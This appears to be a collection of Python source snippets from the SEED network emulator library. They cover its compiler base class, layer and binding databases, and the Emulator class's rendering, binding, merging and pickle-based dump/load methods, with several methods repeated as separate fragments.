  "def _doCompile(self, emulator: Emulator):\n        \"\"\"!\n        @brief Compiler driver implementation.\n\n        This method should be implemented by the compiler driver. The driver\n        class can assume that the current working directory is the output\n        folder.\n\n        @param emulator emulator object.\n        \"\"\"\n        raise NotImplementedError('_doCompile not implemented.')",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get the name of compiler driver.\n\n        @returns name of the driver.\n        \"\"\"\n        raise NotImplementedError('getName not implemented.')",
  "def compile(self, emulator: Emulator, output: str, override: bool = False):\n        \"\"\"!\n        @brief Compile the simulation.\n\n        @param emulator emulator object.\n        @param output output directory path.\n        @param override (optional) override the output folder if it already\n        exist. False by default.\n        \"\"\"\n        assert emulator.rendered(), 'Simulation needs to be rendered before compile.'\n\n        cur = getcwd()\n        if path.exists(output):\n            if override:\n                self._log('output folder \"{}\" already exist, overriding.'.format(output))\n                rmtree(output)\n            else:\n                self._log('output folder \"{}\" already exist. Set \"override = True\" when calling compile() to override.'.format(output))\n                exit(1)\n        mkdir(output)\n        chdir(output)\n        self._doCompile(emulator)\n        chdir(cur)",
  "def _log(self, message: str) -> None:\n        \"\"\"!\n        @brief Log to stderr.\n\n        @param message message.\n        \"\"\"\n        print(\"== {}Compiler: {}\".format(self.getName(), message), file=stderr)",
  "class BindingDatabase(Registrable, Printable):\n    \"\"\"!\n    @brief Registrable wrapper for Bindings.\n\n    classes needs to be Registrable to be saved in the Registry. wrapping\n    bindings database with Registrable allows the bindings to be preserved in\n    dumps.\n    \"\"\"\n\n    db: List[core.Binding]\n    vpnodes: Dict[str, core.Node]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Create a new binding database.\n        \"\"\"\n\n        ## Binding database\n        self.db = []\n\n        ## virtual \"physical nodes\"\n        self.vpnodes = {}\n\n    def print(self, indentation: int) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        return ' ' * indentation + 'BindingDatabase\\n'",
  "class LayerDatabase(Registrable, Printable):\n    \"\"\"!\n    @brief Registrable wrapper for Layers.\n\n    classes needs to be Registrable to be saved in the Registry. wrapping\n    layers database with Registrable allows the layers to be preserved in dumps.\n    \"\"\"\n\n    db: Dict[str, Tuple[core.Layer, bool]]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Build a new layers database.\n        \"\"\"\n\n        ## Layers database\n        self.db = {}\n\n    def print(self, indentation: int) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        return ' ' * indentation + 'LayerDatabase\\n'",
  "class Emulator:\n    \"\"\"!\n    @brief The Emulator class.\n\n    Emulator class is the entry point for emulations. \n    \"\"\"\n\n    __registry: Registry\n    __layers: LayerDatabase\n    __dependencies_db: Dict[str, Set[Tuple[str, bool]]]\n    __rendered: bool\n    __bindings: BindingDatabase\n    __resolved_bindings: Dict[str, core.Node]\n\n    __service_net: Network\n    __service_net_prefix: str\n\n    def __init__(self, serviceNetworkPrefix: str = '192.168.66.0/24'):\n        \"\"\"!\n        @brief Construct a new emulation.\n        \n        @param serviceNetworkPrefix (optional) service network prefix for this\n        emulator. A service network is a network that does not take part in the\n        emulation, and provide access between the emulation nodes and the host\n        node. Service network will not be created unless some layer/service/as\n        asks for it.\n        \"\"\"\n        self.__rendered = False\n        self.__dependencies_db = {}\n        self.__resolved_bindings = {}\n        self.__registry = Registry()\n        self.__layers = LayerDatabase()\n        self.__bindings = BindingDatabase()\n\n        self.__registry.register('seedemu', 'dict', 'layersdb', self.__layers)\n        self.__registry.register('seedemu', 'list', 'bindingdb', self.__bindings)\n\n        self.__service_net_prefix = '192.168.160.0/23'\n        self.__service_net = None\n\n    def __render(self, layerName, optional: bool, configure: bool):\n        \"\"\"!\n        @brief Render a layer.\n        \n        @param layerName name of layer.\n        @throws AssertionError if dependencies unmet \n        \"\"\"\n        verb = 'configure' if configure else 'render'\n\n        self.__log('requesting {}: {}'.format(verb, layerName))\n\n        if optional and layerName not in self.__layers.db:\n            self.__log('{}: not found but is optional, skipping'.format(layerName))\n            return\n\n        assert layerName in self.__layers.db, 'Layer {} required but missing'.format(layerName)\n\n        (layer, done) = self.__layers.db[layerName]\n        if done:\n            self.__log('{}: already done, skipping'.format(layerName))\n            return\n\n        if layerName in self.__dependencies_db:\n            for (dep, opt) in self.__dependencies_db[layerName]:\n                self.__log('{}: requesting dependency render: {}'.format(layerName, dep))\n                self.__render(dep, opt, configure)\n\n        self.__log('entering {}...'.format(layerName))\n\n        hooks: List[core.Hook] = []\n        for hook in self.__registry.getByType('seedemu', 'hook'):\n            if hook.getTargetLayer() == layerName: hooks.append(hook)\n        \n        if configure:\n            self.__log('invoking pre-configure hooks for {}...'.format(layerName))\n            for hook in hooks: hook.preconfigure(self)\n            self.__log('configuring {}...'.format(layerName))\n            layer.configure(self)\n            self.__log('invoking post-configure hooks for {}...'.format(layerName))\n            for hook in hooks: hook.postconfigure(self)\n        else:\n            self.__log('invoking pre-render hooks for {}...'.format(layerName))\n            for hook in hooks: hook.prerender(self)\n            self.__log('rendering {}...'.format(layerName))\n            layer.render(self)\n            self.__log('invoking post-render hooks for {}...'.format(layerName))\n            for hook in hooks: hook.postrender(self)\n        \n        self.__log('done: {}'.format(layerName))\n        self.__layers.db[layerName] = (layer, True)\n    \n    def __loadDependencies(self, deps: Dict[str, Set[Tuple[str, bool]]]):\n        \"\"\"!\n        @brief Load dependencies list.\n\n        @param deps dependencies list.\n        \"\"\"\n        for (layer, deps) in deps.items():\n            if not layer in self.__dependencies_db:\n                self.__dependencies_db[layer] = deps\n                continue\n\n            self.__dependencies_db[layer] |= deps\n\n    def __log(self, message: str):\n        \"\"\"!\n        @brief log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('== Emulator: {}'.format(message), file=stderr)\n\n    def rendered(self) -> bool:\n        \"\"\"!\n        @brief test if the emulator is rendered.\n\n        @returns True if rendered\n        \"\"\"\n        return self.__rendered\n\n    def addHook(self, hook: core.Hook) -> Emulator:\n        \"\"\"!\n        @brief Add a hook.\n\n        @param hook Hook.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__registry.register('seedemu', 'hook', hook.getName(), hook)\n\n        return self\n\n    def addBinding(self, binding: core.Binding) -> Emulator:\n        \"\"\"!\n        @brief Add a binding.\n\n        @param binding binding.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__bindings.db.append(binding)\n\n        return self\n\n    def getBindings(self) -> List[core.Binding]:\n        \"\"\"!\n        @brief Get all bindings.\n\n        @returns list of bindings.\n        \"\"\"\n        return self.__bindings.db\n\n    def addLayer(self, layer: core.Layer) -> Emulator:\n        \"\"\"!\n        @brief Add a layer.\n\n        @param layer layer to add.\n        @throws AssertionError if layer already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        lname = layer.getName()\n        assert lname not in self.__layers.db, 'layer {} already added.'.format(lname)\n        self.__registry.register('seedemu', 'layer', lname, layer)\n        self.__layers.db[lname] = (layer, False)\n\n        return self\n\n    def getLayer(self, layerName: str) -> core.Layer:\n        \"\"\"!\n        @brief Get a layer.\n\n        @param layerName of the layer.\n        @returns layer.\n        \"\"\"\n        return self.__registry.get('seedemu', 'layer', layerName)\n\n    def getLayers(self) -> List[core.Layer]:\n        \"\"\"!\n        @brief Get all layers.\n\n        @returns list of layers.\n        \"\"\"\n        return self.__registry.getByType('seedemu', 'layer')\n    \n    def getServerByVirtualNodeName(self, vnodeName: str) -> core.Server:\n        \"\"\"!\n        @brief Get server by virtual node name. \n\n        Note that vnodeName is created and mapped with server in service layer.\n\n        @param vnodeName name of vnode.\n        @returns server.\n        \"\"\"\n        for (layer, _) in self.__layers.db.values():\n            if not isinstance(layer, core.Service): continue\n            for (vnode, server) in layer.getPendingTargets().items():\n                if vnode == vnodeName:\n                    return server\n        return None\n    \n    def resolvVnode(self, vnode: str) -> core.Node:\n        \"\"\"!\n        @brief resolve physical node for the given virtual node.\n\n        @param vnode virtual node name.\n\n        @returns physical node.\n        \"\"\"\n        if vnode in self.__resolved_bindings: return self.__resolved_bindings[vnode]\n        for binding in self.getBindings():\n            pnode = binding.getCandidate(vnode, self, True)\n            if pnode == None: continue\n            return pnode\n        assert False, 'cannot resolve vnode {}'.format(vnode)\n\n    def getBindingFor(self, vnode: str) -> core.Node:\n        \"\"\"!\n        @brief get physical node for the given virtual node from the\n        pre-populated vnode-pnode mappings.\n\n        Note that the bindings are processed in the early render stage, meaning\n        calls to this function will always fail before render, and only virtual\n        node names that have been used in service will be available to be\n        \"resolve\" to the physical node using this function.\n\n        This is meant to be used by services to find the physical node to\n        install their servers on and should not be used for any other purpose. \n        if you try to resolve some arbitrary vnode names to physical node,\n        use the resolveVnode function instead.\n\n        tl;dr: don't use this, use resolvVnode, unless you know what you are\n        doing.\n\n        @param vnode virtual node.\n\n        @returns physical node.\n        \"\"\"\n        assert vnode in self.__resolved_bindings, 'failed to find binding for vnode {}.'.format(vnode)\n        return self.__resolved_bindings[vnode]\n\n    def getServiceNetwork(self) -> Network:\n        \"\"\"!\n        @brief get the for-service network of this emulation. If one does not\n        exist, a new one will be created.\n\n        A for-service network is a network that does not take part in the\n        emulation, and provide access between the emulation nodes and the host\n        node.\n\n        @returns service network.\n        \"\"\"\n        if self.__service_net == None:\n            self.__service_net = self.__registry.register('seedemu', 'net', '000_svc', Network('000_svc', NetworkType.Bridge, IPv4Network(self.__service_net_prefix), direct = False))\n\n        return self.__service_net\n\n    def render(self) -> Emulator:\n        \"\"\"!\n        @brief Render to emulation.\n\n        @throws AssertionError if dependencies unmet \n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__rendered, 'already rendered.'\n\n        for (layer, _) in self.__layers.db.values():\n            self.__loadDependencies(layer.getDependencies())\n\n        # render base first\n        self.__render('Base', False, True)\n\n        # collect all pending vnode names\n        self.__log('collecting virtual node names in the emulation...')\n        vnodes: List[str] = []\n        for (layer, _) in self.__layers.db.values():\n            if not isinstance(layer, core.Service): continue\n            for (vnode, _) in layer.getPendingTargets().items():\n                assert vnode not in vnodes, 'duplicated vnode: {}'.format(vnode)\n                vnodes.append(vnode)\n        self.__log('found {} virtual nodes.'.format(len(vnodes)))\n\n        # resolv bindings for all vnodes\n        self.__log('resolving binding for all virtual nodes...')\n        for binding in self.getBindings():\n            for vnode in vnodes:\n                if vnode in self.__resolved_bindings: continue\n                pnode = binding.getCandidate(vnode, self)\n                if pnode == None: continue\n                self.__log('vnode {} bound to as{}/{}'.format(vnode, pnode.getAsn(), pnode.getName()))\n                self.__resolved_bindings[vnode] = pnode\n\n        self.__log('applying changes made to virtual physical nodes to real physical nodes...')\n        vpnodes = self.__bindings.vpnodes\n        for (vnode, pnode) in self.__resolved_bindings.items():\n            if not vnode in vpnodes: continue\n            vpnode = vpnodes[vnode]\n\n            self.__log('applying changes made on vnode {} to pnode as{}/{}...'.format(vnode, pnode.getAsn(), pnode.getName()))\n            pnode.copySettings(vpnode)\n\n        for layerName in self.__layers.db.keys():\n            self.__render(layerName, False, True)\n\n        # FIXME\n        for (name, (layer, _)) in self.__layers.db.items():\n            self.__layers.db[name] = (layer, False)\n\n        for layerName in self.__layers.db.keys():\n            self.__render(layerName, False, False)\n\n        self.__rendered = True\n\n        return self\n\n    def compile(self, compiler: core.Compiler, output: str, override: bool = False) -> Emulator:\n        \"\"\"!\n        @brief Compile the simulation.\n\n        @param compiler to use.\n        @param output output directory path.\n        @param override (optional) override the output folder if it already\n        exist. False by default.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        compiler.compile(self, output, override)\n\n        return self\n    \n    def updateOutputDirectory(self, compiler: core.Compiler, callbacks: list) -> Emulator:\n        \"\"\"!\n        @brief update the output directory in a flexible way. Each service might need to update it in a different way\n        @param compiler to use\n        @param callbacks which is a list of custom functions that will be executed to update the output directory\n        \"\"\"\n\n        for func in callbacks:\n            func(compiler)\n\n    def getRegistry(self) -> Registry: \n        \"\"\"!\n        @brief Get the Registry.\n\n        @returns Registry.\n        \"\"\"\n        return self.__registry\n\n    def getVirtualNode(self, vnode_name: str) -> core.Node:\n        \"\"\"!\n        @brief get a virtual \"physical\" node.\n\n        This API allows you to create a \"virtual\" physical node for a virtual\n        node. A real \"Node\" instance will be returned, you can make any changes\n        to it, and those changes will be copied to the real physical node the\n        virtual node has bound to during render.\n\n        Note that all the APIs that require the node to be in an AS will not\n        work. Like `getAsn`, `joinNetwork`, etc. You will get an error if you\n        use them.\n\n        @param vnode_name virtual node name.\n\n        @returns node\n        \"\"\"\n        if vnode_name not in self.__bindings.vpnodes:\n            self.__bindings.vpnodes[vnode_name] = core.Node(vnode_name, NodeRole.Host, 0)\n\n        return self.__bindings.vpnodes[vnode_name]\n\n    def setVirtualNode(self, vnode_name: str, node: core.Node) -> Emulator:\n        \"\"\"!\n        @brief set a virtual node.\n\n        This API allows you to overwrite an existing, or create new virtual node\n        with the given node object.\n\n        You should use the getVirtualNode API instead, unless you know what you\n        are doing.\n\n        @param vnode_name virtual node name.\n        @param node virtual physical node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert node.getAsn() == 0, 'vpnode asn must be 0.'\n        self.__bindings.vpnodes[vnode_name] = node\n\n        return self\n\n    def getVirtualNodes(self) -> Dict[str, core.Node]:\n        \"\"\"!\n        @brief get dict of virtual \"physical\" nodes.\n\n        @return dict of nodes where key is virtual node name.\n        \"\"\"\n        return self.__bindings.vpnodes\n\n    def merge(self, other: Emulator, mergers: List[Merger] = [], vnodePrefix: str = '') -> Emulator:\n        \"\"\"!\n        @brief merge two emulators.\n\n        @param other the other emulator.\n        @param mergers list of merge handlers.\n        @param vnodePrefix prefix to add to the vnodes from the other emulator.\n\n        @returns new emulator.\n        \"\"\"\n\n        new_layers: Dict[Mergeable] = {}\n        other_layers: Dict[Mergeable] = {}\n\n        for l in self.getLayers(): new_layers[l.getTypeName()] = l\n        for l in other.getLayers(): other_layers[l.getTypeName()] = l\n\n        for l in other_layers.values():\n            typename = l.getTypeName()\n\n            if isinstance(l, core.Service):\n                l.addPrefix(vnodePrefix)\n\n            if typename not in new_layers.keys():\n                new_layers[typename] = l\n                continue\n\n            merged = False\n\n            for merger in mergers:\n                if merger.getTargetType() != typename: continue\n                new_layers[typename] = merger.doMerge(new_layers[typename], l)\n                merged = True\n            \n            assert merged, 'abort: no merger found for {}'.format(typename)\n\n        new_sim = Emulator()\n        for l in new_layers.values(): new_sim.addLayer(l)\n\n        for binding in self.getBindings(): new_sim.addBinding(binding)\n        for binding in other.getBindings(): new_sim.addBinding(binding)\n        \n        for hook in self.getRegistry().getByType('seedemu', 'hook'): new_sim.addHook(hook)\n        for hook in other.getRegistry().getByType('seedemu', 'hook'): new_sim.addHook(hook)\n\n        for (v, n) in other.getVirtualNodes().items(): new_sim.setVirtualNode(v, n)\n        for (v, n) in self.getVirtualNodes().items(): new_sim.setVirtualNode(v, n)\n\n        return new_sim\n\n    def dump(self, fileName: str) -> Emulator:\n        \"\"\"!\n        @brief dump the emulation to file.\n\n        @param fileName output path.\n        @throws AssertionError if the emulation is already rendered.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert not self.__rendered, 'cannot dump emulation after render.'\n        with open(fileName, 'wb') as f:\n            pickle.dump(self.__registry, f)\n\n        return self\n\n    def load(self, fileName: str) -> Emulator:\n        \"\"\"!\n        @brief load emulation from file.\n\n        @param fileName path to the dumped emulation.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        with open(fileName, 'rb') as f:\n            self.__rendered = False\n            self.__dependencies_db = {}\n            self.__registry = pickle.load(f)\n            self.__layers = self.__registry.get('seedemu', 'dict', 'layersdb')\n            self.__bindings = self.__registry.get('seedemu', 'list', 'bindingdb')\n\n        return self",
  "def __init__(self):\n        \"\"\"!\n        @brief Create a new binding database.\n        \"\"\"\n\n        ## Binding database\n        self.db = []\n\n        ## virtual \"physical nodes\"\n        self.vpnodes = {}",
  "def print(self, indentation: int) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        return ' ' * indentation + 'BindingDatabase\\n'",
  "def __init__(self):\n        \"\"\"!\n        @brief Build a new layers database.\n        \"\"\"\n\n        ## Layers database\n        self.db = {}",
  "def print(self, indentation: int) -> str:\n        \"\"\"!\n        @brief get printable string.\n\n        @param indentation indentation.\n\n        @returns printable string.\n        \"\"\"\n\n        return ' ' * indentation + 'LayerDatabase\\n'",
  "def __init__(self, serviceNetworkPrefix: str = '192.168.66.0/24'):\n        \"\"\"!\n        @brief Construct a new emulation.\n        \n        @param serviceNetworkPrefix (optional) service network prefix for this\n        emulator. A service network is a network that does not take part in the\n        emulation, and provide access between the emulation nodes and the host\n        node. Service network will not be created unless some layer/service/as\n        asks for it.\n        \"\"\"\n        self.__rendered = False\n        self.__dependencies_db = {}\n        self.__resolved_bindings = {}\n        self.__registry = Registry()\n        self.__layers = LayerDatabase()\n        self.__bindings = BindingDatabase()\n\n        self.__registry.register('seedemu', 'dict', 'layersdb', self.__layers)\n        self.__registry.register('seedemu', 'list', 'bindingdb', self.__bindings)\n\n        self.__service_net_prefix = '192.168.160.0/23'\n        self.__service_net = None",
  "def __render(self, layerName, optional: bool, configure: bool):\n        \"\"\"!\n        @brief Render a layer.\n        \n        @param layerName name of layer.\n        @throws AssertionError if dependencies unmet \n        \"\"\"\n        verb = 'configure' if configure else 'render'\n\n        self.__log('requesting {}: {}'.format(verb, layerName))\n\n        if optional and layerName not in self.__layers.db:\n            self.__log('{}: not found but is optional, skipping'.format(layerName))\n            return\n\n        assert layerName in self.__layers.db, 'Layer {} required but missing'.format(layerName)\n\n        (layer, done) = self.__layers.db[layerName]\n        if done:\n            self.__log('{}: already done, skipping'.format(layerName))\n            return\n\n        if layerName in self.__dependencies_db:\n            for (dep, opt) in self.__dependencies_db[layerName]:\n                self.__log('{}: requesting dependency render: {}'.format(layerName, dep))\n                self.__render(dep, opt, configure)\n\n        self.__log('entering {}...'.format(layerName))\n\n        hooks: List[core.Hook] = []\n        for hook in self.__registry.getByType('seedemu', 'hook'):\n            if hook.getTargetLayer() == layerName: hooks.append(hook)\n        \n        if configure:\n            self.__log('invoking pre-configure hooks for {}...'.format(layerName))\n            for hook in hooks: hook.preconfigure(self)\n            self.__log('configuring {}...'.format(layerName))\n            layer.configure(self)\n            self.__log('invoking post-configure hooks for {}...'.format(layerName))\n            for hook in hooks: hook.postconfigure(self)\n        else:\n            self.__log('invoking pre-render hooks for {}...'.format(layerName))\n            for hook in hooks: hook.prerender(self)\n            self.__log('rendering {}...'.format(layerName))\n            layer.render(self)\n            self.__log('invoking post-render hooks for {}...'.format(layerName))\n            for hook in hooks: hook.postrender(self)\n        \n        self.__log('done: {}'.format(layerName))\n        self.__layers.db[layerName] = (layer, True)",
  "def __loadDependencies(self, deps: Dict[str, Set[Tuple[str, bool]]]):\n        \"\"\"!\n        @brief Load dependencies list.\n\n        @param deps dependencies list.\n        \"\"\"\n        for (layer, deps) in deps.items():\n            if not layer in self.__dependencies_db:\n                self.__dependencies_db[layer] = deps\n                continue\n\n            self.__dependencies_db[layer] |= deps",
  "def __log(self, message: str):\n        \"\"\"!\n        @brief log to stderr.\n\n        @param message message.\n        \"\"\"\n        print('== Emulator: {}'.format(message), file=stderr)",
  "def rendered(self) -> bool:\n        \"\"\"!\n        @brief test if the emulator is rendered.\n\n        @returns True if rendered\n        \"\"\"\n        return self.__rendered",
  "def addHook(self, hook: core.Hook) -> Emulator:\n        \"\"\"!\n        @brief Add a hook.\n\n        @param hook Hook.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__registry.register('seedemu', 'hook', hook.getName(), hook)\n\n        return self",
  "def addBinding(self, binding: core.Binding) -> Emulator:\n        \"\"\"!\n        @brief Add a binding.\n\n        @param binding binding.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__bindings.db.append(binding)\n\n        return self",
  "def getBindings(self) -> List[core.Binding]:\n        \"\"\"!\n        @brief Get all bindings.\n\n        @returns list of bindings.\n        \"\"\"\n        return self.__bindings.db",
  "def addLayer(self, layer: core.Layer) -> Emulator:\n        \"\"\"!\n        @brief Add a layer.\n\n        @param layer layer to add.\n        @throws AssertionError if layer already exist.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        lname = layer.getName()\n        assert lname not in self.__layers.db, 'layer {} already added.'.format(lname)\n        self.__registry.register('seedemu', 'layer', lname, layer)\n        self.__layers.db[lname] = (layer, False)\n\n        return self",
  "def getLayer(self, layerName: str) -> core.Layer:\n        \"\"\"!\n        @brief Get a layer.\n\n        @param layerName of the layer.\n        @returns layer.\n        \"\"\"\n        return self.__registry.get('seedemu', 'layer', layerName)",
  "def getLayers(self) -> List[core.Layer]:\n        \"\"\"!\n        @brief Get all layers.\n\n        @returns list of layers.\n        \"\"\"\n        return self.__registry.getByType('seedemu', 'layer')",
  "def getServerByVirtualNodeName(self, vnodeName: str) -> core.Server:\n        \"\"\"!\n        @brief Get server by virtual node name. \n\n        Note that vnodeName is created and mapped with server in service layer.\n\n        @param vnodeName name of vnode.\n        @returns server.\n        \"\"\"\n        for (layer, _) in self.__layers.db.values():\n            if not isinstance(layer, core.Service): continue\n            for (vnode, server) in layer.getPendingTargets().items():\n                if vnode == vnodeName:\n                    return server\n        return None",
  "def resolvVnode(self, vnode: str) -> core.Node:\n        \"\"\"!\n        @brief resolve physical node for the given virtual node.\n\n        @param vnode virtual node name.\n\n        @returns physical node.\n        \"\"\"\n        if vnode in self.__resolved_bindings: return self.__resolved_bindings[vnode]\n        for binding in self.getBindings():\n            pnode = binding.getCandidate(vnode, self, True)\n            if pnode == None: continue\n            return pnode\n        assert False, 'cannot resolve vnode {}'.format(vnode)",
  "def getBindingFor(self, vnode: str) -> core.Node:\n        \"\"\"!\n        @brief get physical node for the given virtual node from the\n        pre-populated vnode-pnode mappings.\n\n        Note that the bindings are processed in the early render stage, meaning\n        calls to this function will always fail before render, and only virtual\n        node names that have been used in service will be available to be\n        \"resolve\" to the physical node using this function.\n\n        This is meant to be used by services to find the physical node to\n        install their servers on and should not be used for any other purpose. \n        if you try to resolve some arbitrary vnode names to physical node,\n        use the resolveVnode function instead.\n\n        tl;dr: don't use this, use resolvVnode, unless you know what you are\n        doing.\n\n        @param vnode virtual node.\n\n        @returns physical node.\n        \"\"\"\n        assert vnode in self.__resolved_bindings, 'failed to find binding for vnode {}.'.format(vnode)\n        return self.__resolved_bindings[vnode]",
  "def getServiceNetwork(self) -> Network:\n        \"\"\"!\n        @brief get the for-service network of this emulation. If one does not\n        exist, a new one will be created.\n\n        A for-service network is a network that does not take part in the\n        emulation, and provide access between the emulation nodes and the host\n        node.\n\n        @returns service network.\n        \"\"\"\n        if self.__service_net == None:\n            self.__service_net = self.__registry.register('seedemu', 'net', '000_svc', Network('000_svc', NetworkType.Bridge, IPv4Network(self.__service_net_prefix), direct = False))\n\n        return self.__service_net",
  "def render(self) -> Emulator:\n        \"\"\"!\n        @brief Render to emulation.\n\n        @throws AssertionError if dependencies unmet \n        \n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__rendered, 'already rendered.'\n\n        for (layer, _) in self.__layers.db.values():\n            self.__loadDependencies(layer.getDependencies())\n\n        # render base first\n        self.__render('Base', False, True)\n\n        # collect all pending vnode names\n        self.__log('collecting virtual node names in the emulation...')\n        vnodes: List[str] = []\n        for (layer, _) in self.__layers.db.values():\n            if not isinstance(layer, core.Service): continue\n            for (vnode, _) in layer.getPendingTargets().items():\n                assert vnode not in vnodes, 'duplicated vnode: {}'.format(vnode)\n                vnodes.append(vnode)\n        self.__log('found {} virtual nodes.'.format(len(vnodes)))\n\n        # resolv bindings for all vnodes\n        self.__log('resolving binding for all virtual nodes...')\n        for binding in self.getBindings():\n            for vnode in vnodes:\n                if vnode in self.__resolved_bindings: continue\n                pnode = binding.getCandidate(vnode, self)\n                if pnode == None: continue\n                self.__log('vnode {} bound to as{}/{}'.format(vnode, pnode.getAsn(), pnode.getName()))\n                self.__resolved_bindings[vnode] = pnode\n\n        self.__log('applying changes made to virtual physical nodes to real physical nodes...')\n        vpnodes = self.__bindings.vpnodes\n        for (vnode, pnode) in self.__resolved_bindings.items():\n            if not vnode in vpnodes: continue\n            vpnode = vpnodes[vnode]\n\n            self.__log('applying changes made on vnode {} to pnode as{}/{}...'.format(vnode, pnode.getAsn(), pnode.getName()))\n            pnode.copySettings(vpnode)\n\n        for layerName in self.__layers.db.keys():\n            self.__render(layerName, False, True)\n\n        # FIXME\n        for (name, (layer, _)) in self.__layers.db.items():\n            self.__layers.db[name] = (layer, False)\n\n        for layerName in self.__layers.db.keys():\n            self.__render(layerName, False, False)\n\n        self.__rendered = True\n\n        return self",
  "def compile(self, compiler: core.Compiler, output: str, override: bool = False) -> Emulator:\n        \"\"\"!\n        @brief Compile the simulation.\n\n        @param compiler to use.\n        @param output output directory path.\n        @param override (optional) override the output folder if it already\n        exist. False by default.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        compiler.compile(self, output, override)\n\n        return self",
  "def updateOutputDirectory(self, compiler: core.Compiler, callbacks: list) -> Emulator:\n        \"\"\"!\n        @brief update the output directory in a flexible way. Each service might need to update it in a different way\n        @param compiler to use\n        @param callbacks which is a list of custom functions that will be executed to update the output directory\n        \"\"\"\n\n        for func in callbacks:\n            func(compiler)",
  "def getRegistry(self) -> Registry: \n        \"\"\"!\n        @brief Get the Registry.\n\n        @returns Registry.\n        \"\"\"\n        return self.__registry",
  "def getVirtualNode(self, vnode_name: str) -> core.Node:\n        \"\"\"!\n        @brief get a virtual \"physical\" node.\n\n        This API allows you to create a \"virtual\" physical node for a virtual\n        node. A real \"Node\" instance will be returned, you can make any changes\n        to it, and those changes will be copied to the real physical node the\n        virtual node has bound to during render.\n\n        Note that all the APIs that require the node to be in an AS will not\n        work. Like `getAsn`, `joinNetwork`, etc. You will get an error if you\n        use them.\n\n        @param vnode_name virtual node name.\n\n        @returns node\n        \"\"\"\n        if vnode_name not in self.__bindings.vpnodes:\n            self.__bindings.vpnodes[vnode_name] = core.Node(vnode_name, NodeRole.Host, 0)\n\n        return self.__bindings.vpnodes[vnode_name]",
  "def setVirtualNode(self, vnode_name: str, node: core.Node) -> Emulator:\n        \"\"\"!\n        @brief set a virtual node.\n\n        This API allows you to overwrite an existing, or create new virtual node\n        with the given node object.\n\n        You should use the getVirtualNode API instead, unless you know what you\n        are doing.\n\n        @param vnode_name virtual node name.\n        @param node virtual physical node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert node.getAsn() == 0, 'vpnode asn must be 0.'\n        self.__bindings.vpnodes[vnode_name] = node\n\n        return self",
  "def getVirtualNodes(self) -> Dict[str, core.Node]:\n        \"\"\"!\n        @brief get dict of virtual \"physical\" nodes.\n\n        @return dict of nodes where key is virtual node name.\n        \"\"\"\n        return self.__bindings.vpnodes",
  "def merge(self, other: Emulator, mergers: List[Merger] = [], vnodePrefix: str = '') -> Emulator:\n        \"\"\"!\n        @brief merge two emulators.\n\n        @param other the other emulator.\n        @param mergers list of merge handlers.\n        @param vnodePrefix prefix to add to the vnodes from the other emulator.\n\n        @returns new emulator.\n        \"\"\"\n\n        new_layers: Dict[Mergeable] = {}\n        other_layers: Dict[Mergeable] = {}\n\n        for l in self.getLayers(): new_layers[l.getTypeName()] = l\n        for l in other.getLayers(): other_layers[l.getTypeName()] = l\n\n        for l in other_layers.values():\n            typename = l.getTypeName()\n\n            if isinstance(l, core.Service):\n                l.addPrefix(vnodePrefix)\n\n            if typename not in new_layers.keys():\n                new_layers[typename] = l\n                continue\n\n            merged = False\n\n            for merger in mergers:\n                if merger.getTargetType() != typename: continue\n                new_layers[typename] = merger.doMerge(new_layers[typename], l)\n                merged = True\n            \n            assert merged, 'abort: no merger found for {}'.format(typename)\n\n        new_sim = Emulator()\n        for l in new_layers.values(): new_sim.addLayer(l)\n\n        for binding in self.getBindings(): new_sim.addBinding(binding)\n        for binding in other.getBindings(): new_sim.addBinding(binding)\n        \n        for hook in self.getRegistry().getByType('seedemu', 'hook'): new_sim.addHook(hook)\n        for hook in other.getRegistry().getByType('seedemu', 'hook'): new_sim.addHook(hook)\n\n        for (v, n) in other.getVirtualNodes().items(): new_sim.setVirtualNode(v, n)\n        for (v, n) in self.getVirtualNodes().items(): new_sim.setVirtualNode(v, n)\n\n        return new_sim",
  "def dump(self, fileName: str) -> Emulator:\n        \"\"\"!\n        @brief dump the emulation to file.\n\n        @param fileName output path.\n        @throws AssertionError if the emulation is already rendered.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert not self.__rendered, 'cannot dump emulation after render.'\n        with open(fileName, 'wb') as f:\n            pickle.dump(self.__registry, f)\n\n        return self",
  "def load(self, fileName: str) -> Emulator:\n        \"\"\"!\n        @brief load emulation from file.\n\n        @param fileName path to the dumped emulation.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        with open(fileName, 'rb') as f:\n            self.__rendered = False\n            self.__dependencies_db = {}\n            self.__registry = pickle.load(f)\n            self.__layers = self.__registry.get('seedemu', 'dict', 'layersdb')\n            self.__bindings = self.__registry.get('seedemu', 'list', 'bindingdb')\n\n        return self",
